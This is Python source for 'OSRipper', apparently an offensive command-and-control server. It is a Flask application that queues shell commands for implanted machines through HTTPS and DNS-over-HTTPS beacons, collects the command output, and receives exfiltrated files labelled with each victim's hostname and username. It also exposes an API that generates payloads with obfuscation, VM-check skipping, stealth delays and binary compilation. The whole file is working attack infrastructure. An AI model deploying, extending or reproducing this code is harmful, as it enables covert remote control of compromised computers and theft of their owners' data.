#!/usr/bin/env python3
"""
C2 Server Flask Application
Main server with DoH handler and web UI
"""

import os
import json
import sys
from pathlib import Path
from flask import Flask, request, jsonify, render_template, send_from_directory
from .session_manager import SessionManager
from .doh_handler import DoHHandler
from .cert_utils import generate_self_signed_cert, get_certificate_fingerprint


class C2Server:
    """C2 Server application."""
    
    def __init__(self, domain, db_path='c2_sessions.db', host='0.0.0.0', port=5000, use_https=False, cert_file=None, key_file=None):
        """
        Initialize C2 server.
        
        Args:
            domain: C2 domain name
            db_path: Path to session database
            host: Server host address
            port: Server port
            use_https: Enable HTTPS with self-signed certificate
            cert_file: Path to certificate file (auto-generated if None and use_https=True)
            key_file: Path to private key file (auto-generated if None and use_https=True)
        """
        self.domain = domain
        self.host = host
        self.port = port
        self.use_https = use_https
        self.cert_file = cert_file
        self.key_file = key_file
        
        # Generate self-signed certificate if HTTPS enabled
        if use_https and not cert_file:
            cert_file = os.path.join(os.getcwd(), 'c2_server.crt')
            key_file = os.path.join(os.getcwd(), 'c2_server.key')
            
            if not os.path.exists(cert_file) or not os.path.exists(key_file):
                print("[*] Generating self-signed certificate...")
                generate_self_signed_cert(hostname=domain or 'localhost', cert_file=cert_file, key_file=key_file)
                print(f"[+] Certificate generated: {cert_file}")
                print(f"[+] Private key generated: {key_file}")
            
            self.cert_file = cert_file
            self.key_file = key_file
        
        # Initialize components
        self.session_manager = SessionManager(db_path)
        self.doh_handler = DoHHandler(self.session_manager)
        
        # Get absolute paths for templates and static files
        c2_dir = Path(__file__).parent
        template_dir = c2_dir / 'templates'
        static_dir = c2_dir / 'static'
        
        # Create Flask app
        self.app = Flask(__name__, 
                        template_folder=str(template_dir),
                        static_folder=str(static_dir))
        
        # Register routes
        self._register_routes()
        self._register_exfil_routes()
    
    def _register_routes(self):
        """Register Flask routes."""
        
        # DoH endpoint
        @self.app.route('/dns-query', methods=['GET'])
        def doh_query():
            """Handle DNS-over-HTTPS queries."""
            query_name = request.args.get('name', '')
            query_type = request.args.get('type', 'TXT')
            
            if not query_name:
                return jsonify({'Status': 2, 'Answer': []}), 400
            
            # Process DoH query
            response_data = self.doh_handler.process_doh_query(
                query_name, query_type, self.domain
            )
            
            # Format DNS response
            dns_response = self.doh_handler.format_dns_response(response_data)
            
            return jsonify(dns_response)
        
        # Web UI routes
        @self.app.route('/')
        def index():
            """Dashboard page."""
            sessions = self.session_manager.get_all_sessions()
            return render_template('index.html', sessions=sessions)
        
        @self.app.route('/session/<session_id>')
        def session_view(session_id):
            """Session detail page."""
            session = self.session_manager.get_session(session_id)
            if not session:
                return "Session not found", 404
            
            history = self.session_manager.get_session_history(session_id)
            return render_template('session.html', session=session, history=history)
        
        @self.app.route('/generate')
        def generate_page():
            """Payload generation page."""
            return render_template('generate.html')
        
        # API routes
        @self.app.route('/api/sessions')
        def api_sessions():
            """Get all sessions."""
            sessions = self.session_manager.get_all_sessions()
            return jsonify(sessions)
        
        @self.app.route('/api/session/<session_id>', methods=['GET', 'DELETE'])
        def api_session(session_id):
            """Get or delete session."""
            if request.method == 'DELETE':
                # Delete session
                success = self.session_manager.delete_session(session_id)
                if success:
                    return jsonify({'status': 'deleted'})
                else:
                    return jsonify({'error': 'Session not found'}), 404
            
            # GET - Get session details
            session = self.session_manager.get_session(session_id)
            if not session:
                return jsonify({'error': 'Session not found'}), 404
            
            history = self.session_manager.get_session_history(session_id)
            return jsonify({
                'session': session,
                'history': history
            })
        
        @self.app.route('/api/session/<session_id>/command', methods=['POST'])
        def api_send_command(session_id):
            """Send command to session."""
            data = request.get_json()
            command = data.get('command', '')
            
            if not command:
                return jsonify({'error': 'Command required'}), 400
            
            # Queue command
            self.session_manager.queue_command(session_id, command)
            
            return jsonify({'status': 'queued'})
        
        @self.app.route('/api/session/<session_id>/history')
        def api_history(session_id):
            """Get command history for session."""
            limit = request.args.get('limit', 100, type=int)
            history = self.session_manager.get_session_history(session_id, limit)
            return jsonify(history)
        
        @self.app.route('/api/session/<session_id>/files', methods=['GET'])
        def api_list_files(session_id):
            """List files (placeholder - would need agent support)."""
            # This would require agent to support file listing
            # For now, return empty list
            return jsonify([])
        
        @self.app.route('/api/beacon', methods=['POST'])
        def api_beacon():
            """HTTPS beacon endpoint."""
            try:
                data = request.get_json()
                session_id = data.get('session_id') if data else None
                
                print(f"[*] Beacon received - Session ID: {session_id}")
                
                if not session_id:
                    print("[!] Beacon missing session_id")
                    return jsonify({'error': 'Session ID required'}), 400
                
                # Check if session was deleted
                if self.session_manager.is_session_deleted(session_id):
                    # Return termination command
                    return jsonify({'command': '__TERMINATE__'})
                
                # Check if session exists, create if it doesn't
                existing_session = self.session_manager.get_session(session_id)
                if not existing_session:
                    # New session - create it
                    print(f"[+] Creating new session: {session_id}")
                    # Try to get system info from request headers or data
                    hostname = data.get('hostname') or request.headers.get('X-Hostname')
                    username = data.get('username') or request.headers.get('X-Username')
                    platform_info = data.get('platform') or request.headers.get('X-Platform')
                    
                    # Create new session
                    success = self.session_manager.create_session(
                        session_id=session_id,
                        hostname=hostname,
                        username=username,
                        platform=platform_info
                    )
                    if success:
                        print(f"[+] Session created successfully: {session_id}")
                    else:
                        # Log error but don't fail the request
                        print(f"[!] Failed to create session: {session_id}")
                else:
                    # Existing session - update last seen
                    print(f"[*] Updating existing session: {session_id}")
                    # Also update system info if provided and session doesn't have it
                    hostname = data.get('hostname') or request.headers.get('X-Hostname')
                    username = data.get('username') or request.headers.get('X-Username')
                    platform_info = data.get('platform') or request.headers.get('X-Platform')
                    
                    # Update session info if missing
                    if (hostname or username or platform_info) and (
                        not existing_session.get('hostname') or 
                        not existing_session.get('username') or 
                        not existing_session.get('platform')
                    ):
                        self.session_manager.update_session_info(
                            session_id, 
                            hostname=hostname, 
                            username=username, 
                            platform=platform_info
                        )
                    
                    self.session_manager.update_last_seen(session_id)
                
                # Get next command from queue
                command = self.session_manager.get_next_command(session_id)
                
                if command:
                    return jsonify({'command': command})
                else:
                    return jsonify({'command': None})
            except Exception as e:
                import traceback
                print(f"[!] Error in beacon endpoint: {e}")
                traceback.print_exc()
                return jsonify({'error': 'Internal server error'}), 500
        
        @self.app.route('/api/response', methods=['POST'])
        def api_response():
            """HTTPS response endpoint."""
            data = request.get_json()
            session_id = data.get('session_id')
            response_data = data.get('response')
            
            if not session_id or not response_data:
                return jsonify({'error': 'Session ID and response required'}), 400
            
            try:
                # Decode response
                import base64
                decoded = base64.urlsafe_b64decode(response_data)
                response_text = decoded.decode('utf-8', errors='ignore')
                
                # Parse response
                lines = response_text.split('\n')
                retcode = None
                cwd = None
                stdout = ''
                stderr = ''
                command = None
                
                # Track which section we're currently in
                current_section = None
                
                for line in lines:
                    if line.startswith('RETCODE:'):
                        retcode = line[8:].strip()
                        current_section = None
                    elif line.startswith('CWD:'):
                        cwd = line[4:].strip()
                        current_section = None
                    elif line.startswith('STDOUT:'):
                        stdout = line[7:]
                        current_section = 'stdout'
                    elif line.startswith('STDERR:'):
                        stderr = line[7:]
                        current_section = 'stderr'
                    elif current_section == 'stdout':
                        # Continuation of stdout
                        if stdout:
                            stdout += '\n' + line
                        else:
                            stdout = line
                    elif current_section == 'stderr':
                        # Continuation of stderr
                        if stderr:
                            stderr += '\n' + line
                        else:
                            stderr = line
                
                # Ensure retcode is a string (default to '0' if None)
                if retcode is None:
                    retcode = '0'
                
                # Get the most recent command from history that's waiting for response
                # We'll try to find the command by looking at recent history
                history = self.session_manager.get_session_history(session_id, limit=10)
                command = None
                if history:
                    # Find the most recent command that's still waiting for response
                    for entry in history:
                        if entry.get('response') == 'Waiting for response...':
                            command = entry.get('command')
                            break
                    
                    # If no waiting command found, use the most recent one (fallback)
                    if not command:
                        command = history[0].get('command')
                
                if command:
                    # Update the existing history entry with the response
                    full_response = f"RETCODE: {retcode}\nCWD: {cwd}\nSTDOUT:\n{stdout}\nSTDERR:\n{stderr}"
                    rows_updated = self.session_manager.update_response(session_id, command, full_response)
                    if rows_updated > 0:
                        print(f"[+] Updated response for command '{command}' from session {session_id[:16]}...")
                    else:
                        print(f"[!] Warning: Failed to update response for command '{command}' - no matching entry found")
                else:
                    # Fallback: if no history, save as new entry
                    print(f"[!] Warning: No command found in history for session {session_id}, saving as new entry")
                    command = "unknown_command"
                    full_response = f"RETCODE: {retcode}\nCWD: {cwd}\nSTDOUT:\n{stdout}\nSTDERR:\n{stderr}"
                    self.session_manager.save_response(session_id, command, full_response)
                
                return jsonify({'status': 'ok'})
            except Exception as e:
                import traceback
                print(f"[!] Error processing response: {e}")
                traceback.print_exc()
                return jsonify({'error': 'Failed to process response'}), 500
        
        @self.app.route('/api/download/<path:filename>')
        def api_download(filename):
            """Download generated payload file."""
            # Security: Only allow downloads from tmp and results directories
            if '..' in filename or filename.startswith('/'):
                return jsonify({'error': 'Invalid filename'}), 400
            
            # Extract just the filename (in case path is included)
            basename = os.path.basename(filename)
            
            # Check in multiple locations: tmp/results/, results/, tmp/
            possible_paths = [
                os.path.join(os.getcwd(), 'tmp', 'results', basename),
                os.path.join(os.getcwd(), 'results', basename),
                os.path.join(os.getcwd(), 'tmp', basename),
            ]
            
            file_path = None
            for path in possible_paths:
                if os.path.exists(path) and os.path.isfile(path):
                    file_path = path
                    break
            
            if not file_path:
                return jsonify({'error': 'File not found'}), 404
            
            return send_from_directory(os.path.dirname(file_path), os.path.basename(file_path), as_attachment=True)
        
        @self.app.route('/api/cert-fingerprint')
        def api_cert_fingerprint():
            """Get certificate fingerprint for HTTPS payloads."""
            if not self.use_https or not self.cert_file:
                return jsonify({'error': 'HTTPS not enabled'}), 400
            
            fingerprint = get_certificate_fingerprint(self.cert_file)
            if fingerprint:
                return jsonify({
                    'fingerprint': fingerprint,
                    'cert_file': self.cert_file
                })
            else:
                return jsonify({'error': 'Failed to get fingerprint'}), 500
        
        @self.app.route('/api/cert-fingerprint-from-url', methods=['POST'])
        def api_cert_fingerprint_from_url():
            """Get certificate fingerprint from URL."""
            data = request.get_json()
            url = data.get('url', '')
            
            if not url:
                return jsonify({'error': 'URL required'}), 400
            
            from .cert_utils import get_certificate_fingerprint_from_url
            fingerprint = get_certificate_fingerprint_from_url(url)
            
            if fingerprint:
                return jsonify({'fingerprint': fingerprint})
            else:
                return jsonify({'error': 'Failed to get fingerprint from URL'}), 500
        
        @self.app.route('/api/generate-payload', methods=['POST'])
        def api_generate_payload():
            """Generate payload via API."""
            try:
                data = request.get_json()
                payload_type = data.get('payload_type')
                
                if not payload_type:
                    return jsonify({'success': False, 'error': 'Payload type required'}), 400
                
                # Import generator functions
                from ..generator import (
                    create_doh_payload,
                    create_https_payload,
                    Generator
                )
                
                # Create tmp directory for web-generated payloads
                tmp_dir = os.path.join(os.getcwd(), "tmp")
                os.makedirs(tmp_dir, exist_ok=True)
                
                # Change to tmp directory for generation
                original_cwd = os.getcwd()
                os.chdir(tmp_dir)
                
                try:
                    output_name = data.get('output', 'payload')
                    # Ensure .py extension if not present
                    if not output_name.endswith('.py'):
                        output_name = output_name + '.py'
                    
                    stealth_delay = data.get('delay', False)
                    skip_vm_checks = data.get('testing', False)
                    obfuscate = data.get('obfuscate', False)
                    enhanced = data.get('enhanced', False)
                    compile_binary = data.get('compile', False)
                    icon_path = data.get('icon')
                
                    result = {
                        'success': True,
                        'payload_type': payload_type,
                        'output_file': output_name
                    }
                    
                    # Generate payload based on type (only new shells)
                    if payload_type == 'doh':
                        domain = data.get('domain')
                        if not domain:
                            return jsonify({'success': False, 'error': 'Domain required for DoH payload'}), 400
                        create_doh_payload(domain, output_name, stealth_delay=stealth_delay, skip_vm_checks=skip_vm_checks)
                        result['message'] = f'Start C2 server: python -m osripper.c2.server {domain}'
                    
                    elif payload_type == 'https':
                        base_url = data.get('base_url')
                        cert_fingerprint = data.get('cert_fingerprint')
                        if not base_url:
                            return jsonify({'success': False, 'error': 'Base URL required for HTTPS payload'}), 400
                        create_https_payload(base_url, output_name, stealth_delay=stealth_delay, cert_fingerprint=cert_fingerprint, skip_vm_checks=skip_vm_checks)
                        result['message'] = f'HTTPS payload created. C2 server should be running at {base_url}'
                    
                    else:
                        return jsonify({'success': False, 'error': 'Unknown payload type'}), 400
                    
                    # Check if file was created
                    if not os.path.exists(output_name):
                        return jsonify({'success': False, 'error': f'Generated file not found: {output_name}'}), 500
                    
                    # Post-processing (obfuscation and compilation)
                    if obfuscate or compile_binary:
                        source_file = output_name  # Already has .py extension
                        if not os.path.exists(source_file):
                            return jsonify({'success': False, 'error': f'Generated file not found: {source_file}'}), 500
                        
                        # Handle icon path (relative to original cwd)
                        final_icon_path = None
                        if icon_path:
                            if os.path.isabs(icon_path):
                                final_icon_path = icon_path
                            else:
                                final_icon_path = os.path.join(original_cwd, icon_path)
                            if not os.path.exists(final_icon_path):
                                final_icon_path = None
                        
                        generator = Generator(
                            source_file=source_file,
                            output_name=os.path.splitext(output_name)[0],  # Remove .py for output name
                            icon_path=final_icon_path,
                            quiet=True
                        )
                        
                        success = generator.generate(
                            obfuscate=obfuscate,
                            compile_binary=compile_binary,
                            enhanced_obfuscation=enhanced
                        )
                        
                        if not success:
                            return jsonify({'success': False, 'error': 'Post-processing failed'}), 500
                        
                        # Update result with binary file if compiled
                        if compile_binary:
                            base_name = os.path.splitext(output_name)[0]
                            binary_filename = f"{base_name}.bin"
                            # Check in tmp/results first (where Generator actually puts files)
                            tmp_results_dir = os.path.join(os.getcwd(), "results")
                            original_results_dir = os.path.join(original_cwd, "results")
                            
                            binary_file = os.path.join(tmp_results_dir, binary_filename)
                            if os.path.exists(binary_file):
                                result['binary_file'] = binary_filename
                                result['binary_path'] = f"tmp/results/{binary_filename}"
                            elif os.path.exists(os.path.join(original_results_dir, binary_filename)):
                                result['binary_file'] = binary_filename
                                result['binary_path'] = f"results/{binary_filename}"
                        
                        # Update output file if obfuscated
                        if obfuscate:
                            base_name = os.path.splitext(output_name)[0]
                            obfuscated_file = f"{base_name}_or.py"
                            # Check in results directory (Generator uses os.getcwd() which is tmp_dir)
                            # So files are in tmp_dir/results/ or original_cwd/results/
                            tmp_results_dir = os.path.join(os.getcwd(), "results")
                            original_results_dir = os.path.join(original_cwd, "results")
                            
                            # Check tmp_dir/results first (where Generator actually puts files)
                            obfuscated_in_tmp_results = os.path.join(tmp_results_dir, obfuscated_file)
                            if os.path.exists(obfuscated_in_tmp_results):
                                result['output_file'] = obfuscated_file
                                result['output_path'] = f"tmp/results/{obfuscated_file}"
                            # Check original_cwd/results
                            elif os.path.exists(os.path.join(original_results_dir, obfuscated_file)):
                                result['output_file'] = obfuscated_file
                                result['output_path'] = f"results/{obfuscated_file}"
                            # Check current directory (tmp_dir)
                            elif os.path.exists(obfuscated_file):
                                result['output_file'] = obfuscated_file
                                result['output_path'] = f"tmp/{obfuscated_file}"
                    
                    # Set file paths relative to project root (if not already set)
                    if 'output_path' not in result:
                        result['output_path'] = f"tmp/{output_name}"
                    if not obfuscate and not compile_binary:
                        result['output_file'] = output_name
                    
                    # Add download URLs (use actual output_file, which may be obfuscated)
                    download_file = result.get('output_file', output_name)
                    result['download_url'] = f"/api/download/{download_file}"
                    if result.get('binary_file'):
                        result['binary_download_url'] = f"/api/download/{result['binary_file']}"
                    
                    return jsonify(result)
                    
                finally:
                    # Always return to original directory
                    os.chdir(original_cwd)
                
            except Exception as e:
                import traceback
                traceback.print_exc()
                # Make sure we're back in original directory even on error
                try:
                    if 'original_cwd' in locals():
                        os.chdir(original_cwd)
                except:
                    pass
                return jsonify({'success': False, 'error': str(e)}), 500
    
    def _register_exfil_routes(self):
        """Register exfiltration data upload routes."""
        exfil_dir = os.path.join(os.getcwd(), 'exfil_data')
        os.makedirs(exfil_dir, exist_ok=True)

        @self.app.route('/api/exfil/upload', methods=['POST'])
        def exfil_upload():
            """Receive uploaded extraction data from exfil payloads."""
            try:
                if 'file' not in request.files:
                    return jsonify({'error': 'No file'}), 400

                f = request.files['file']
                hostname = request.form.get('hostname', 'unknown')
                username = request.form.get('username', 'unknown')
                plat = request.form.get('platform', 'unknown')
                caption = request.form.get('caption', '')

                from datetime import datetime
                ts = datetime.now().strftime('%Y%m%d_%H%M%S')
                safe_host = ''.join(c if c.isalnum() or c in '-_.' else '_' for c in hostname)
                dest_name = f'{safe_host}_{ts}_{f.filename}'
                dest_path = os.path.join(exfil_dir, dest_name)
                f.save(dest_path)

                print(f'[EXFIL] Received {f.filename} from {username}@{hostname} '
                      f'({plat}) — saved as {dest_name}')

                meta = {
                    'filename': dest_name,
                    'original_name': f.filename,
                    'hostname': hostname,
                    'username': username,
                    'platform': plat,
                    'caption': caption,
                    'timestamp': ts,
                    'size': os.path.getsize(dest_path),
                }
                meta_path = dest_path + '.json'
                with open(meta_path, 'w') as mf:
                    json.dump(meta, mf, indent=2)

                return jsonify({'status': 'ok', 'filename': dest_name})
            except Exception as e:
                print(f'[EXFIL] Upload error: {e}')
                return jsonify({'error': str(e)}), 500

        @self.app.route('/api/exfil/beacon', methods=['POST'])
        def exfil_beacon():
            """Receive status beacons from exfil payloads."""
            try:
                data = request.get_json() or {}
                hostname = data.get('hostname', '?')
                username = data.get('username', '?')
                plat = data.get('platform', '?')
                message = data.get('message', '')
                print(f'[EXFIL BEACON] {username}@{hostname} ({plat}): {message}')
                return jsonify({'status': 'ok'})
            except Exception as e:
                return jsonify({'error': str(e)}), 500

        @self.app.route('/api/exfil/list')
        def exfil_list():
            """List all received exfil data files."""
            files = []
            for fname in sorted(os.listdir(exfil_dir)):
                if fname.endswith('.json'):
                    try:
                        with open(os.path.join(exfil_dir, fname)) as mf:
                            files.append(json.load(mf))
                    except Exception:
                        pass
            return jsonify(files)

        @self.app.route('/api/exfil/download/<filename>')
        def exfil_download(filename):
            """Download an exfil data file."""
            basename = os.path.basename(filename)
            fpath = os.path.join(exfil_dir, basename)
            if not os.path.exists(fpath):
                return jsonify({'error': 'Not found'}), 404
            return send_from_directory(exfil_dir, basename, as_attachment=True)

    def run(self, debug=False):
        """
        Run C2 server.
        
        Args:
            debug: Enable Flask debug mode
        """
        protocol = 'https' if self.use_https else 'http'
        print(f"[*] Starting C2 server on {self.host}:{self.port}")
        print(f"[*] Domain: {self.domain}")
        print(f"[*] Protocol: {protocol.upper()}")
        print(f"[*] Web UI: {protocol}://{self.host}:{self.port}")
        print(f"[*] DoH endpoint: {protocol}://{self.host}:{self.port}/dns-query")
        
        if self.use_https:
            if not self.cert_file or not self.key_file:
                print("[!] HTTPS enabled but certificate files not found!")
                return
            
            # Get fingerprint for display
            fingerprint = get_certificate_fingerprint(self.cert_file)
            if fingerprint:
                print(f"[*] Certificate fingerprint: {fingerprint}")
            
            # Run with SSL context
            context = (self.cert_file, self.key_file)
            self.app.run(host=self.host, port=self.port, debug=debug, ssl_context=context)
        else:
            self.app.run(host=self.host, port=self.port, debug=debug)


def main():
    """Main entry point."""
    import argparse
    
    parser = argparse.ArgumentParser(description='OSRipper C2 Server')
    parser.add_argument('domain', help='C2 domain name')
    parser.add_argument('--host', default='0.0.0.0', help='Server host')
    parser.add_argument('--port', type=int, default=5000, help='Server port')
    parser.add_argument('--db', default='c2_sessions.db', help='Database path')
    parser.add_argument('--https', action='store_true', help='Enable HTTPS with self-signed certificate')
    parser.add_argument('--cert', help='Path to certificate file (for HTTPS)')
    parser.add_argument('--key', help='Path to private key file (for HTTPS)')
    parser.add_argument('--debug', action='store_true', help='Debug mode')
    
    args = parser.parse_args()
    
    # Create and run server
    server = C2Server(
        domain=args.domain,
        db_path=args.db,
        host=args.host,
        port=args.port,
        use_https=args.https,
        cert_file=args.cert,
        key_file=args.key
    )
    
    server.run(debug=args.debug)


if __name__ == '__main__':
    main()

